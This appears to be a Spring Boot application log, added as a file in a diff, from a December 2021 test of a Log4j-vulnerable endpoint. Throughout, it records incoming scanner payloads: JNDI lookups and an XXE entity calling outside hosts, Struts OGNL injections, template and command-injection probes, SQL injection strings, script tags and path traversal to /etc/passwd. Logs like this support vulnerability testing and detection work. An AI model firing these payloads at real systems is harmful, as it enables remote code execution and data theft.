@@ -1,0 +1,529 @@
+2021-12-16 17:59:39.685  INFO 21992 --- [main] com.example.mybatis.MybatisApplication   : Starting MybatisApplication using Java 1.8.0_291 on DESKTOP-5EOU7OT with PID 21992 (D:\mybatis\target\classes started by lok in D:\mybatis)
+2021-12-16 17:59:39.688  INFO 21992 --- [main] com.example.mybatis.MybatisApplication   : No active profile set, falling back to default profiles: default
+2021-12-16 17:59:40.531  INFO 21992 --- [main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)
+2021-12-16 17:59:40.538  INFO 21992 --- [main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
+2021-12-16 17:59:40.538  INFO 21992 --- [main] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.52]
+2021-12-16 17:59:40.626  INFO 21992 --- [main] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext
+2021-12-16 17:59:40.626  INFO 21992 --- [main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 893 ms
+2021-12-16 17:59:41.065  INFO 21992 --- [main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path ''
+2021-12-16 17:59:41.072  INFO 21992 --- [main] com.example.mybatis.MybatisApplication   : Started MybatisApplication in 1.764 seconds (JVM running for 3.54)
+2021-12-16 17:59:45.788  INFO 21992 --- [http-nio-8080-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring DispatcherServlet 'dispatcherServlet'
+2021-12-16 17:59:45.789  INFO 21992 --- [http-nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Initializing Servlet 'dispatcherServlet'
+2021-12-16 17:59:45.789  INFO 21992 --- [http-nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 0 ms
+2021-12-16 17:59:45.805 ERROR 21992 --- [http-nio-8080-exec-1] c.e.mybatis.controller.UserController    : ${jndi:ldap://6fe96ed5.dns.1433.eu.org/exp}
+2021-12-16 18:00:10.548 ERROR 21992 --- [http-nio-8080-exec-4] c.e.mybatis.controller.UserController    : ${jndi:ldap://6fe96ed5.dns.1433.eu.org/exp}
+2021-12-16 18:00:10.794 ERROR 21992 --- [http-nio-8080-exec-5] c.e.mybatis.controller.UserController    : ${jndi:ldap://6fe96ed5.dns.1433.eu.org/exp}
+2021-12-16 18:00:11.027 ERROR 21992 --- [http-nio-8080-exec-8] c.e.mybatis.controller.UserController    : ${jndi:ldap://6fe96ed5.dns.1433.eu.org/exp}
+2021-12-16 18:04:40.273  INFO 14036 --- [main] com.example.mybatis.MybatisApplication   : Starting MybatisApplication using Java 1.8.0_291 on DESKTOP-5EOU7OT with PID 14036 (D:\mybatis\target\classes started by lok in D:\mybatis)
+2021-12-16 18:04:40.275  INFO 14036 --- [main] com.example.mybatis.MybatisApplication   : No active profile set, falling back to default profiles: default
+2021-12-16 18:04:41.145  INFO 14036 --- [main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)
+2021-12-16 18:04:41.154  INFO 14036 --- [main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
+2021-12-16 18:04:41.154  INFO 14036 --- [main] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.52]
+2021-12-16 18:04:41.230  INFO 14036 --- [main] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext
+2021-12-16 18:04:41.231  INFO 14036 --- [main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 911 ms
+2021-12-16 18:04:41.710  INFO 14036 --- [main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path ''
+2021-12-16 18:04:41.718  INFO 14036 --- [main] com.example.mybatis.MybatisApplication   : Started MybatisApplication in 1.823 seconds (JVM running for 3.677)
+2021-12-16 18:04:49.349  INFO 14036 --- [http-nio-8080-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring DispatcherServlet 'dispatcherServlet'
+2021-12-16 18:04:49.349  INFO 14036 --- [http-nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Initializing Servlet 'dispatcherServlet'
+2021-12-16 18:04:49.350  INFO 14036 --- [http-nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 0 ms
+2021-12-16 18:04:49.366 ERROR 14036 --- [http-nio-8080-exec-1] c.e.mybatis.controller.UserController    : ${jndi:ldap://6fe96ed5.dns.1433.eu.org/exp}
+2021-12-16 18:06:07.667  INFO 5896 --- [main] com.example.mybatis.MybatisApplication   : Starting MybatisApplication using Java 1.8.0_291 on DESKTOP-5EOU7OT with PID 5896 (D:\mybatis\target\classes started by lok in D:\mybatis)
+2021-12-16 18:06:07.669  INFO 5896 --- [main] com.example.mybatis.MybatisApplication   : No active profile set, falling back to default profiles: default
+2021-12-16 18:06:08.499  INFO 5896 --- [main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)
+2021-12-16 18:06:08.505  INFO 5896 --- [main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
+2021-12-16 18:06:08.506  INFO 5896 --- [main] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.52]
+2021-12-16 18:06:08.575  INFO 5896 --- [main] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext
+2021-12-16 18:06:08.575  INFO 5896 --- [main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 868 ms
+2021-12-16 18:06:09.011  INFO 5896 --- [main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path ''
+2021-12-16 18:06:09.019  INFO 5896 --- [main] com.example.mybatis.MybatisApplication   : Started MybatisApplication in 1.711 seconds (JVM running for 3.557)
+2021-12-16 18:06:57.164  INFO 5896 --- [http-nio-8080-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring DispatcherServlet 'dispatcherServlet'
+2021-12-16 18:06:57.165  INFO 5896 --- [http-nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Initializing Servlet 'dispatcherServlet'
+2021-12-16 18:06:57.165  INFO 5896 --- [http-nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 0 ms
+2021-12-16 18:06:57.180 ERROR 5896 --- [http-nio-8080-exec-1] c.e.mybatis.controller.UserController    : ${jndi:ldap://6fe96ed5.dns.1433.eu.org/exp}
+2021-12-16 18:06:57.612 ERROR 5896 --- [http-nio-8080-exec-2] c.e.mybatis.controller.UserController    : ${jndi:ldap://6fe96ed5.dns.1433.eu.org/exp}
+2021-12-16 18:06:58.075 ERROR 5896 --- [http-nio-8080-exec-3] c.e.mybatis.controller.UserController    : ${jndi:ldap://6fe96ed5.dns.1433.eu.org/exp}
+2021-12-16 18:06:58.474 ERROR 5896 --- [http-nio-8080-exec-4] c.e.mybatis.controller.UserController    : ${jndi:ldap://6fe96ed5.dns.1433.eu.org/exp}
+2021-12-16 18:07:02.291 ERROR 5896 --- [http-nio-8080-exec-7] c.e.mybatis.controller.UserController    : ${jndi:ldap://6fe96ed5.dns.1433.eu.org/exp}
+2021-12-16 18:11:22.640 ERROR 5896 --- [http-nio-8080-exec-10] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:11:42.368 ERROR 5896 --- [http-nio-8080-exec-3] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:22.229 ERROR 5896 --- [http-nio-8080-exec-7] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:30.186 ERROR 5896 --- [http-nio-8080-exec-8] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:36.514 ERROR 5896 --- [http-nio-8080-exec-2] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:36.724 ERROR 5896 --- [http-nio-8080-exec-4] c.e.mybatis.controller.UserController    : ${822687987+971270759}
+2021-12-16 18:13:36.771 ERROR 5896 --- [http-nio-8080-exec-6] c.e.mybatis.controller.UserController    : 123
+expr 918728938 + 880905626
+
+2021-12-16 18:13:36.773 ERROR 5896 --- [http-nio-8080-exec-5] c.e.mybatis.controller.UserController    : ${@var_dump(md5(373585893))};
+2021-12-16 18:13:36.775 ERROR 5896 --- [http-nio-8080-exec-7] c.e.mybatis.controller.UserController    : /*1*/{{896389968+921292736}}
+2021-12-16 18:13:36.777 ERROR 5896 --- [http-nio-8080-exec-9] c.e.mybatis.controller.UserController    : %{41571*43198}
+2021-12-16 18:13:36.788 ERROR 5896 --- [http-nio-8080-exec-8] c.e.mybatis.controller.UserController    : (#context["xwork.MethodAccessor.denyMethodExecution"]=new java.lang.Boolean(false),#_memberAccess["allowStaticMethodAccess"]=true,#x=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#x.println(42517*43797),#x.close())(meh)
+2021-12-16 18:13:36.790 ERROR 5896 --- [http-nio-8080-exec-10] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:36.791 ERROR 5896 --- [http-nio-8080-exec-2] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:36.793 ERROR 5896 --- [http-nio-8080-exec-3] c.e.mybatis.controller.UserController    : syvnecxykrlzynyjeweg
+2021-12-16 18:13:36.798 ERROR 5896 --- [http-nio-8080-exec-1] c.e.mybatis.controller.UserController    : <?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "http://45.128.222.152:58888/i/10af9f/02ea/qg4e/">]><a>&content;</a>
+2021-12-16 18:13:36.798 ERROR 5896 --- [http-nio-8080-exec-4] c.e.mybatis.controller.UserController    : ${jndi:rmi://45.128.222.152:10999/i/hcSvqI7U/6d6ee5/i5we/80ht/PQ5P8iBh/?Type=A Type&Name=1100110&Char=!}
+2021-12-16 18:13:36.825 ERROR 5896 --- [http-nio-8080-exec-5] c.e.mybatis.controller.UserController    : null
+2021-12-16 18:13:36.828  INFO 5896 --- [http-nio-8080-exec-7] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in the request target [/user/log4j?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i97%29%28%28%27%5C43xman.getWriter%28%29.println%2843980*42745%29%27%29%28d%29%29&%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29 ]. The valid characters are defined in RFC 7230 and RFC 3986
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:494) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:269) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_291]
+
+2021-12-16 18:13:36.830  INFO 5896 --- [http-nio-8080-exec-2] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in the request target [/user/log4j?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(40348*43694),1?%23xx:%23request.toString&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse ]. The valid characters are defined in RFC 7230 and RFC 3986
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:494) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:269) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_291]
+
+2021-12-16 18:13:36.830 ERROR 5896 --- [http-nio-8080-exec-3] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:36.830 ERROR 5896 --- [http-nio-8080-exec-8] c.e.mybatis.controller.UserController    : null
+2021-12-16 18:13:36.833 ERROR 5896 --- [http-nio-8080-exec-1] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:36.834 ERROR 5896 --- [http-nio-8080-exec-4] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:36.836 ERROR 5896 --- [http-nio-8080-exec-5] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:36.840 ERROR 5896 --- [http-nio-8080-exec-1] c.e.mybatis.controller.UserController    : '-var_dump(md5(649408836))-'
+2021-12-16 18:13:36.840 ERROR 5896 --- [http-nio-8080-exec-3] c.e.mybatis.controller.UserController    : 123|expr 976475680 + 816753620 
+2021-12-16 18:13:36.840 ERROR 5896 --- [http-nio-8080-exec-8] c.e.mybatis.controller.UserController    : ${872372989+868861376}
+2021-12-16 18:13:36.852 ERROR 5896 --- [http-nio-8080-exec-10] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is org.springframework.web.multipart.MultipartException: Failed to parse multipart servlet request; nested exception is org.apache.tomcat.util.http.fileupload.InvalidFileNameException: Invalid file name: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-RES',42306*40996)}\0b] with root cause
+
+org.apache.tomcat.util.http.fileupload.InvalidFileNameException: Invalid file name: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-RES',42306*40996)}\0b
+	at org.apache.tomcat.util.http.fileupload.util.Streams.checkFileName(Streams.java:188) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.impl.FileItemStreamImpl.getName(FileItemStreamImpl.java:157) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.http.fileupload.FileUploadBase.parseRequest(FileUploadBase.java:286) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.Request.parseParts(Request.java:2922) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.Request.getParts(Request.java:2824) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.RequestFacade.getParts(RequestFacade.java:1098) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.multipart.support.StandardMultipartHttpServletRequest.parseRequest(StandardMultipartHttpServletRequest.java:95) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.multipart.support.StandardMultipartHttpServletRequest.<init>(StandardMultipartHttpServletRequest.java:88) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.multipart.support.StandardServletMultipartResolver.resolveMultipart(StandardServletMultipartResolver.java:122) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.DispatcherServlet.checkMultipart(DispatcherServlet.java:1202) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1036) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:681) ~[tomcat-embed-core-9.0.52.jar:4.0.FR]
+	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.3.9.jar:5.3.9]
+	at javax.servlet.http.HttpServlet.service(HttpServlet.java:764) ~[tomcat-embed-core-9.0.52.jar:4.0.FR]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) ~[tomcat-embed-websocket-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.3.9.jar:5.3.9]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:197) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:135) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:382) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_291]
+
+2021-12-16 18:13:36.853 ERROR 5896 --- [http-nio-8080-exec-9] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:36.859 ERROR 5896 --- [http-nio-8080-exec-8] c.e.mybatis.controller.UserController    : <eufwxuhcwp>
+2021-12-16 18:13:36.870 ERROR 5896 --- [http-nio-8080-exec-4] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:36.875 ERROR 5896 --- [http-nio-8080-exec-2] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:36.886 ERROR 5896 --- [http-nio-8080-exec-10] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:36.892 ERROR 5896 --- [http-nio-8080-exec-1] c.e.mybatis.controller.UserController    : 123$(expr 943606383 + 891780377)
+2021-12-16 18:13:36.899 ERROR 5896 --- [http-nio-8080-exec-9] c.e.mybatis.controller.UserController    : ${(828885683+803547466)?c}
+2021-12-16 18:13:36.905  INFO 5896 --- [http-nio-8080-exec-7] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in the HTTP protocol [Type&Name=1100110&Char=!} ]
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:570) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:269) ~[tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.52.jar:9.0.52]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_291]
+
+2021-12-16 18:13:36.907 ERROR 5896 --- [http-nio-8080-exec-4] c.e.mybatis.controller.UserController    : <sCrIpT>eufwxuhcwp</ScRiPt>
+2021-12-16 18:13:36.916 ERROR 5896 --- [http-nio-8080-exec-8] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:36.920 ERROR 5896 --- [http-nio-8080-exec-6] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:36.937 ERROR 5896 --- [http-nio-8080-exec-4] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:36.940 ERROR 5896 --- [http-nio-8080-exec-10] c.e.mybatis.controller.UserController    : 123&set /A 985910761+933695638
+2021-12-16 18:13:36.942 ERROR 5896 --- [http-nio-8080-exec-6] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:36.946 ERROR 5896 --- [http-nio-8080-exec-1] c.e.mybatis.controller.UserController    : #set($c=881967922+999272098)${c}$c
+2021-12-16 18:13:36.983 ERROR 5896 --- [http-nio-8080-exec-7] c.e.mybatis.controller.UserController    : 123
+2021-12-16 18:13:36.984 ERROR 5896 --- [http-nio-8080-exec-9] c.e.mybatis.controller.UserController    : 123'and/**/extractvalue(1,concat(char(126),md5(1448558744)))and'
+2021-12-16 18:13:36.987  WARN 5896 --- [http-nio-8080-exec-6] o.s.w.s.r.ResourceHttpRequestHandler     : Path with "WEB-INF" or "META-INF": [user/s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml]
+2021-12-16 18:13:36.987 ERROR 5896 --- [http-nio-8080-exec-8] c.e.mybatis.controller.UserController    : 123/**/and+0=0
+2021-12-16 18:13:36.994 ERROR 5896 --- [http-nio-8080-exec-10] c.e.mybatis.controller.UserController    : expr 936692934 + 899851904
+2021-12-16 18:13:37.007 ERROR 5896 --- [http-nio-8080-exec-4] c.e.mybatis.controller.UserController    : <%- 952715613+985087315 %>
+2021-12-16 18:13:37.039 ERROR 5896 --- [http-nio-8080-exec-3] c.e.mybatis.controller.UserController    : 123"and/**/extractvalue(1,concat(char(126),md5(1096654930)))and"
+2021-12-16 18:13:37.043 ERROR 5896 --- [http-nio-8080-exec-6] c.e.mybatis.controller.UserController    : 123/**/and+2=7
+2021-12-16 18:13:37.059  WARN 5896 --- [http-nio-8080-exec-7] o.s.w.s.r.ResourceHttpRequestHandler     : Path with "WEB-INF" or "META-INF": [user/s/sgulfa/_/WEB-INF/web.xml]
+2021-12-16 18:13:37.089 ERROR 5896 --- [http-nio-8080-exec-9] c.e.mybatis.controller.UserController    : 123'and'p'='p
+2021-12-16 18:13:37.089 ERROR 5896 --- [http-nio-8080-exec-3] c.e.mybatis.controller.UserController    : extractvalue(1,concat(char(126),md5(1913254521)))
+2021-12-16 18:13:37.090  WARN 5896 --- [http-nio-8080-exec-7] o.s.w.s.r.ResourceHttpRequestHandler     : Path contains "../" after call to StringUtils#cleanPath: [user/test/pathtraversal/master/../../../../../../etc/passwd]
+2021-12-16 18:13:37.111  WARN 5896 --- [http-nio-8080-exec-2] o.s.w.s.r.ResourceHttpRequestHandler     : Path contains "../" after call to StringUtils#cleanPath: [user/a/b//../../../../../../../etc/resolv.conf]
+2021-12-16 18:13:37.145 ERROR 5896 --- [http-nio-8080-exec-8] c.e.mybatis.controller.UserController    : 123'and'p'='t
+2021-12-16 18:13:37.148 ERROR 5896 --- [http-nio-8080-exec-6] c.e.mybatis.controller.UserController    : 123'and(select'1'from/**/cast(md5(1624380766)as/**/int))>'0
+2021-12-16 18:13:37.193 ERROR 5896 --- [http-nio-8080-exec-10] c.e.mybatis.controller.UserController    : 123"and"n"="n
+2021-12-16 18:13:37.198 ERROR 5896 --- [http-nio-8080-exec-5] c.e.mybatis.controller.UserController    : 123/**/and/**/cast(md5('1303146980')as/**/int)>0
+2021-12-16 18:13:37.244 ERROR 5896 --- [http-nio-8080-exec-1] c.e.mybatis.controller.UserController    : 123"and"g"="y
